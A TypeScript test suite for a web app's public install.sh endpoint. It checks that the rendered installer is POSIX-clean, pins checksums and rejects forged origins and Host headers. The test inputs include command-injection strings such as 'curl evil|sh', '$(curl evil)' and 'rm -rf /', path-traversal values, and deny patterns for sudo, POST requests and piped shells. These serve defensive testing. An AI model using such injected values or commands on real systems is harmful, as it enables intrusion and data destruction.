/**
 * The public installer: `GET /install.sh` and the renderer behind it.
 *
 * Everything here is offline. Nothing downloads, nothing installs, and no shell
 * command from the script is ever executed — the script is checked as a DOCUMENT
 * (`sh -n`, `shellcheck -s sh`, and assertions about what it may and may not
 * contain), because the interesting failures are all things that would be baked
 * into a file somebody else pipes into `sh`.
 */

import { spawnSync } from "node:child_process";
import { mkdtempSync, writeFileSync } from "node:fs";
import { tmpdir } from "node:os";
import { join } from "node:path";
import { beforeEach, describe, expect, it, vi } from "vitest";
import {
  InstallScriptRenderError,
  isValidInstallScriptOrigin,
  renderInstallScript,
  renderUnavailableScript,
  type InstallScriptArtifact,
} from "../src/lib/server/install-script/render";
import type { AgentReleaseLookup, AgentReleaseSource } from "../src/lib/server/install-script/manifest";

// The route reads the published release from the filesystem, which is a gitignored
// build artifact (`npm run build:agent`) and therefore absent on a clean checkout.
// Stubbing the lookup is what makes the route's own behaviour — origin resolution,
// headers, degraded mode — assertable in both worlds. The real lookup is exercised
// at the bottom of this file through its injected source, with no mocking at all.
const lookup = vi.hoisted(() => ({ current: null as AgentReleaseLookup | null }));
vi.mock("$lib/server/install-script/manifest", () => ({
  loadAgentRelease: (): AgentReleaseLookup => lookup.current ?? { release: null, reason: "no release" },
}));

const { GET } = await import("../src/routes/install.sh/+server");
const { loadAgentRelease } = await vi.importActual<typeof import("../src/lib/server/install-script/manifest")>(
  "../src/lib/server/install-script/manifest",
);

const VERSION = "0.1.0";
const ARTIFACTS: InstallScriptArtifact[] = [
  {
    os: "linux",
    arch: "amd64",
    path: `/agent/${VERSION}/pdmux-agent-linux-amd64`,
    sha256: "ea09e960b04826c22f13315f768983e39901e00a0c98cf3036f4c41d00ad67b7",
  },
  {
    os: "linux",
    arch: "arm64",
    path: `/agent/${VERSION}/pdmux-agent-linux-arm64`,
    sha256: "ba1458dfa4e54dbeae4bb5a6bd333afd289c3ae3059bc9f135fc8b59f0cf0b52",
  },
  {
    os: "darwin",
    arch: "amd64",
    path: `/agent/${VERSION}/pdmux-agent-darwin-amd64`,
    sha256: "769398e19c8c492fa69d3b84e7cf6acde9d4c99c30b977f9848c894d39174b09",
  },
  {
    os: "darwin",
    arch: "arm64",
    path: `/agent/${VERSION}/pdmux-agent-darwin-arm64`,
    sha256: "f1c36e3d1414de70e688073dd464734ccf8044e343abb3c1e2ab3381dba713c0",
  },
];

const ORIGIN = "https://pdmux.example.com";
const script = (over: Partial<Parameters<typeof renderInstallScript>[0]> = {}): string =>
  renderInstallScript({ origin: ORIGIN, version: VERSION, artifacts: ARTIFACTS, ...over });

// ---------------------------------------------------------------------------
// Shell tooling
// ---------------------------------------------------------------------------

const scratch = mkdtempSync(join(tmpdir(), "pdmux-install-script-"));
let written = 0;

function toFile(text: string): string {
  written += 1;
  const path = join(scratch, `install-${written}.sh`);
  writeFileSync(path, text);
  return path;
}

/** `shellcheck` on PATH, or wherever $SHELLCHECK points (npx caches it outside PATH). */
const SHELLCHECK = process.env["SHELLCHECK"] ?? "shellcheck";
const hasShellcheck = spawnSync(SHELLCHECK, ["--version"], { encoding: "utf8" }).status === 0;

// ---------------------------------------------------------------------------

describe("[TC-PDWEB-005] rendered install script", () => {
  it("[TC-PDWEB-005] parses as POSIX sh", () => {
    const result = spawnSync("sh", ["-n", toFile(script())], { encoding: "utf8" });
    expect(result.stderr).toBe("");
    expect(result.status).toBe(0);
  });

  it.skipIf(!hasShellcheck)("[TC-PDWEB-005] passes shellcheck -s sh with no findings", () => {
    const result = spawnSync(SHELLCHECK, ["-s", "sh", toFile(script())], { encoding: "utf8" });
    expect(result.stdout).toBe("");
    expect(result.status).toBe(0);
  });

  it("[TC-PDWEB-005] opens with the shebang, set -eu and umask 077 — in that order", () => {
    // umask is third because every file this script can create is created below it.
    // A later umask is a window in which the download or the .bak copy lands with
    // the ambient mode of whatever account ran the one-liner.
    const lines = script().split("\n");
    expect(lines[0]).toBe("#!/bin/sh");
    expect(lines[1]).toBe("set -eu");
    expect(lines[2]).toBe("umask 077");
  });

  it("[TC-PDWEB-005] bakes the origin, the version and every checksum", () => {
    const text = script();
    expect(text).toContain(`PDMUX_ORIGIN='${ORIGIN}'`);
    expect(text).toContain(`PDMUX_AGENT_VERSION='${VERSION}'`);
    for (const artifact of ARTIFACTS) {
      expect(text).toContain(`    ${artifact.os}-${artifact.arch})`);
      expect(text).toContain(`artifact_path='${artifact.path}'`);
      expect(text).toContain(`artifact_sha256='${artifact.sha256}'`);
    }
    // The placeholder target from the template must be gone, or an unlisted
    // platform would resolve to a build that was never published.
    expect(text).not.toContain("/agent/0.0.0/");
    expect(text).not.toContain("@@");
  });

  it("[TC-PDWEB-005] refuses every unsupported target rather than substituting one", () => {
    const text = script({ artifacts: [ARTIFACTS[0] as InstallScriptArtifact] });
    // One published arm plus the catch-all. `return 1` is what the caller turns
    // into exit 3 — never a fallback to some other architecture's binary.
    expect(text).toContain("    linux-amd64)");
    expect(text).not.toContain("    linux-arm64)");
    expect(text).toMatch(/\*\)\n\s+return 1\n/);
  });

  it("[TC-PDWEB-005] uses no bash-only syntax", () => {
    const text = script();
    const bashisms: Array<[string, RegExp]> = [
      ["[[ ]] test", /\[\[/],
      ["local", /\blocal\s+[A-Za-z_]/],
      ["declare", /\bdeclare\s+-/],
      ["process substitution", /[<>]\(/],
      ["function keyword", /\bfunction\s+[A-Za-z_]\w*\s*[({]/],
      ["echo with flags", /\becho\s+-[eEn]/],
      ["ANSI-C quoting", /\$'/],
      ["indirect expansion", /\$\{!/],
      ["array subscript", /\$\{[A-Za-z_]\w*\[/],
      ["source builtin", /(?:^|\s)source\s+[./$]/m],
      ["bash shebang", /#!.*\bbash\b/],
    ];
    for (const [name, pattern] of bashisms) {
      expect(text, `rendered script must not use ${name}`).not.toMatch(pattern);
    }
  });

  it("[TC-PDWEB-005] never leaks the enrollment code and never turns on tracing", () => {
    const text = script();
    // Tracing would put the code — which is on this script's own command line —
    // into every log that captures stderr.
    expect(text).not.toMatch(/^\s*set\s+-[a-z]*x/m);
    // The code is passed to exactly one process. It is never printed, never
    // redirected into a file, and never interpolated into a unit or a plist.
    expect(text).not.toMatch(/(?:echo|printf|logger|tee)[^\n]*\$\{?code\b/);
    expect(text).not.toMatch(/\$\{?code\}?"?\s*>/);
    // And the script never does the exchange itself: no POST, so the long-lived
    // host token can never pass through the shell (and there is no POST for `-L`
    // to replay onto another host).
    expect(text).not.toMatch(/\bcurl\b[^\n]*(?:-X\s+POST|--request\s+POST|--data\b|-d\s)/);
    expect(text).not.toMatch(/\bwget\b[^\n]*--post/);
    // Nothing here escalates on its own initiative; the refusal prints advice.
    expect(text).not.toMatch(/^\s*sudo\s/m);
    // There is no way to opt out of verification.
    expect(text).not.toMatch(/skip-checksum|no-verify|insecure/i);
    // No second stage is piped into a shell.
    expect(text).not.toMatch(/\|\s*(?:sudo\s+)?(?:sh|bash)\b(?!\s*-s\s+--\s+--code)/);
  });

  it("[TC-PDWEB-005] downloads into the destination directory and replaces by rename", () => {
    const text = script();
    // A temp file elsewhere would put the rename across a filesystem boundary,
    // where it stops being atomic; writing over a running executable is ETXTBSY.
    expect(text).toContain('tmp_file="$install_dir/.$BINARY_NAME.$$.download"');
    expect(text).toContain('mv -f "$tmp_file" "$target"');
    expect(text).toContain('cp -p "$target" "$backup"');
  });

  it.each([
    ['https://x.com";curl evil|sh;"', "command injection through a quoted break-out"],
    ["https://x.com'; curl evil | sh; '", "single-quote break-out"],
    ["https://x.com/$(curl evil)", "command substitution"],
    ["https://x.com/`id`", "backtick substitution"],
    ["https://x.com\nrm -rf /", "newline injection"],
    ["https://user:pw@evil.example", "userinfo hiding the real host"],
    ["https://x.com/install", "a path"],
    ["https://x.com?a=b", "a query string"],
    ["https://X.COM", "an unnormalised host"],
    ["ftp://x.com", "a non-http scheme"],
    ["javascript:alert(1)", "a script URL"],
    ["https://x.com:99999", "an impossible port"],
    ["https://[::1]:3000", "an IPv6 literal this allowlist does not parse"],
    ["", "nothing at all"],
  ])("[TC-PDWEB-005] refuses to render for %s (%s)", (origin) => {
    expect(isValidInstallScriptOrigin(origin)).toBe(false);
    expect(() => script({ origin })).toThrow(InstallScriptRenderError);
  });

  it.each([
    ["https://pdmux.example.com", "a plain https origin"],
    ["http://localhost:5001", "a local dev origin"],
    ["https://pdmux.example.com:8443", "an explicit port"],
    ["http://10.0.0.4", "an IPv4 literal"],
    ["https://a-b.c-d.example", "hyphenated labels"],
  ])("[TC-PDWEB-005] accepts %s (%s)", (origin) => {
    expect(isValidInstallScriptOrigin(origin)).toBe(true);
    expect(script({ origin })).toContain(`PDMUX_ORIGIN='${origin}'`);
  });

  it("[TC-PDWEB-005] refuses a manifest it cannot vouch for", () => {
    const good = ARTIFACTS[0] as InstallScriptArtifact;
    expect(() => script({ version: "not-a-version" })).toThrow(InstallScriptRenderError);
    expect(() => script({ artifacts: [] })).toThrow(InstallScriptRenderError);
    // A checksum that is not 64 lowercase hex characters cannot be compared to the
    // output of sha256sum, so the script would reject every download — silently,
    // as a checksum mismatch, on every host.
    expect(() => script({ artifacts: [{ ...good, sha256: "deadbeef" }] })).toThrow(InstallScriptRenderError);
    expect(() => script({ artifacts: [{ ...good, sha256: good.sha256.toUpperCase() }] })).toThrow(
      InstallScriptRenderError,
    );
    // The download must stay inside this version's public directory.
    expect(() => script({ artifacts: [{ ...good, path: "/etc/passwd" }] })).toThrow(InstallScriptRenderError);
    expect(() => script({ artifacts: [{ ...good, path: `/agent/${VERSION}/../../secret` }] })).toThrow(
      InstallScriptRenderError,
    );
    expect(() => script({ artifacts: [{ ...good, path: "/agent/9.9.9/pdmux-agent-linux-amd64" }] })).toThrow(
      InstallScriptRenderError,
    );
    expect(() => script({ artifacts: [{ ...good, os: "linux; rm -rf /" }] })).toThrow(InstallScriptRenderError);
    // Two arms for one target: the second is dead code and the operator silently
    // gets whichever checksum was written first.
    expect(() => script({ artifacts: [good, good] })).toThrow(InstallScriptRenderError);
  });

  it("[TC-PDWEB-005] renders a degraded script that is itself POSIX-clean and exits 1", () => {
    const text = renderUnavailableScript("Nothing to install; run npm run build:agent (see docs).");
    expect(text.split("\n")[0]).toBe("#!/bin/sh");
    expect(text).toContain("Nothing to install; run npm run build:agent (see docs).");
    expect(text.trimEnd().endsWith("exit 1")).toBe(true);
    const result = spawnSync("sh", ["-n", toFile(text)], { encoding: "utf8" });
    expect(result.status).toBe(0);
  });

  it("[TC-PDWEB-005] strips quoting characters out of a degraded script's reason", () => {
    // The reason is composed from fixed strings today, but it is the one value in
    // that script that is interpolated at all — so it is neutralised, not trusted.
    const text = renderUnavailableScript("bad'; curl evil | sh; echo '");
    expect(text).not.toContain("curl evil | sh");
    // The reason ends up inside a single-quoted printf argument, so a surviving
    // quote (or backslash, or newline) is the entire attack.
    const reason = /^printf 'install\.sh: %s\\n' '(.*)' >&2$/m.exec(text)?.[1];
    expect(reason).toBeDefined();
    expect(reason).not.toMatch(/['\\\n]/);
    expect(spawnSync("sh", ["-n", toFile(text)], { encoding: "utf8" }).status).toBe(0);
  });
});

// ---------------------------------------------------------------------------

type RouteEvent = Parameters<typeof GET>[0];

function routeEvent(headers: Record<string, string>): RouteEvent {
  return {
    request: new Request("http://internal-listener:3000/install.sh", { headers }),
    url: new URL("http://internal-listener:3000/install.sh"),
    // ⚠ Deliberately unusable. Reading a static asset through `event.fetch` is a real
    // network request under adapter-node (see manifest.ts), so the route must never
    // reach for it — a rejection here is a failing test, not a caught error.
    fetch: () => Promise.reject(new Error("the route must not fetch anything")),
  } as unknown as RouteEvent;
}

async function call(headers: Record<string, string>): Promise<Response> {
  return (await GET(routeEvent(headers))) as Response;
}

describe("[TC-PDWEB-004] GET /install.sh", () => {
  beforeEach(() => {
    lookup.current = { release: { version: VERSION, artifacts: ARTIFACTS }, reason: null };
  });

  it("[TC-PDWEB-004] answers as a shell script that no cache may keep or share", async () => {
    const response = await call({ "x-forwarded-proto": "https", "x-forwarded-host": "pdmux.example.com" });

    expect(response.status).toBe(200);
    expect(response.headers.get("content-type")).toBe("text/x-shellscript; charset=utf-8");
    // no-store and Vary are one defence, not two: the body is derived from a header
    // an attacker controls, so a cache that keyed on the URL alone would serve one
    // visitor's forged origin to the next operator who runs the one-liner.
    expect(response.headers.get("cache-control")).toBe("no-store");
    const vary = response.headers.get("vary") ?? "";
    expect(vary).toMatch(/x-forwarded-host/i);
    expect(vary).toMatch(/\bhost\b/i);
    expect(response.headers.get("x-content-type-options")).toBe("nosniff");
  });

  it("[TC-PDWEB-004] takes the origin from the proxy headers, not from the listener's own URL", async () => {
    // adapter-node derives url.origin from the ORIGIN env var; a deployment that
    // forgot to set it would bake http://localhost:3000 into every installer and
    // fail on every host, silently and identically.
    const body = await (await call({ "x-forwarded-proto": "https", "x-forwarded-host": "pdmux.example.com" })).text();

    expect(body).toContain("PDMUX_ORIGIN='https://pdmux.example.com'");
    expect(body).not.toContain("internal-listener");
  });

  it("[TC-PDWEB-004] falls back to Host, defaults the scheme to https, and normalises case", async () => {
    expect(await (await call({ host: "PDMUX.example.com" })).text()).toContain(
      "PDMUX_ORIGIN='https://pdmux.example.com'",
    );
    expect(await (await call({ "x-forwarded-proto": "http", host: "box.lan:5001" })).text()).toContain(
      "PDMUX_ORIGIN='http://box.lan:5001'",
    );
    // A chained proxy appends; the client-facing hop is the first value.
    expect(
      await (
        await call({ "x-forwarded-proto": "https, http", "x-forwarded-host": "pdmux.example.com, internal:3000" })
      ).text(),
    ).toContain("PDMUX_ORIGIN='https://pdmux.example.com'");
  });

  it.each([
    ['x.com";curl evil|sh;"', "quote break-out"],
    ["x.com/$(id)", "command substitution"],
    ["evil.example/../../etc", "path traversal"],
    ["user:pw@evil.example", "userinfo"],
  ])("[TC-PDWEB-004] refuses a forged Host header (%s: %s)", async (host) => {
    const response = await call({ "x-forwarded-host": host });
    const body = await response.text();

    // Still a 200 — `curl -fsSL | sh` prints nothing for an error status — but a
    // script that installs nothing, names no attacker-supplied value, and exits 1.
    expect(response.status).toBe(200);
    expect(body).not.toContain(host);
    expect(body).not.toContain("evil");
    // Nothing was baked: no origin, no download, no checksum table.
    expect(body).not.toContain("PDMUX_ORIGIN=");
    expect(body).not.toContain("resolve_artifact");
    expect(body.trimEnd().endsWith("exit 1")).toBe(true);
    expect(spawnSync("sh", ["-n", toFile(body)], { encoding: "utf8" }).status).toBe(0);
  });

  it("[TC-PDWEB-004] refuses a request with no host header at all", async () => {
    const response = await call({});
    const body = await response.text();

    expect(response.status).toBe(200);
    expect(body).toContain("X-Forwarded-Host");
    expect(body.trimEnd().endsWith("exit 1")).toBe(true);
  });

  it("[TC-PDWEB-004] serves a 200 that explains itself when no agent build is published", async () => {
    // A dev checkout, or an image built without the Go stage. A 503 through
    // `curl -fsSL | sh` prints NOTHING: the operator watches an empty prompt and
    // has no idea whether the command ran.
    lookup.current = { release: null, reason: "This deployment publishes no pdmux-agent build." };
    const response = await call({ "x-forwarded-host": "pdmux.example.com" });
    const body = await response.text();

    expect(response.status).toBe(200);
    expect(response.headers.get("content-type")).toBe("text/x-shellscript; charset=utf-8");
    expect(body).toContain("This deployment publishes no pdmux-agent build.");
    expect(body.trimEnd().endsWith("exit 1")).toBe(true);
    expect(spawnSync("sh", ["-n", toFile(body)], { encoding: "utf8" }).status).toBe(0);
  });
});

// ---------------------------------------------------------------------------

describe("[TC-PDWEB-004] release manifest lookup", () => {
  const body = (version: string): string =>
    JSON.stringify({ version, builtAt: "2026-07-26T00:00:00.000Z", artifacts: ARTIFACTS });

  const source = (versions: string[], read: (version: string) => string | null): AgentReleaseSource => ({
    list: () => versions.map((version) => ({ version, dir: `/published/${version}` })),
    read: ({ version }) => read(version),
  });

  it("[TC-PDWEB-004] reads the newest published version from the served tree", () => {
    const asked: string[] = [];
    const result = loadAgentRelease(
      source(["0.2.0", "0.1.0"], (version) => {
        asked.push(version);
        return body(version);
      }),
    );

    // Newest first, and exactly one read: no round trip, no second candidate.
    expect(asked).toEqual(["0.2.0"]);
    expect(result.release?.version).toBe("0.2.0");
    expect(result.release?.artifacts).toHaveLength(ARTIFACTS.length);
  });

  it("[TC-PDWEB-004] degrades with a reason instead of throwing", () => {
    const cases: Array<[string, AgentReleaseSource, RegExp]> = [
      ["nothing published", source([], () => null), /build:agent/],
      ["manifest missing", source(["0.1.0"], () => null), /release files are incomplete/],
      ["not JSON", source(["0.1.0"], () => "<html>"), /not valid JSON/],
      ["not an object", source(["0.1.0"], () => "[]"), /no usable artifacts/],
      ["no artifacts", source(["0.1.0"], () => JSON.stringify({ version: "0.1.0", artifacts: [] })), /no usable artifacts/],
      // A manifest naming another version means its checksums describe a different
      // set of files than its paths do.
      ["version mismatch", source(["0.1.0"], () => body("0.9.9")), /declares a different version/],
    ];
    for (const [name, stub, expected] of cases) {
      const result = loadAgentRelease(stub);
      expect(result.release, name).toBeNull();
      expect(result.reason ?? "", name).toMatch(expected);
    }
  });

  it("[TC-PDWEB-004] never names a server-side directory in a reason", () => {
    // The reason is printed to an anonymous caller. `/published/0.1.0` is where the
    // stub says the files live; the operator gets the public URL instead.
    const result = loadAgentRelease(source(["0.1.0"], () => null));
    expect(result.reason ?? "").toContain("/agent/0.1.0/manifest.json");
    expect(result.reason ?? "").not.toContain("/published/");
  });
});
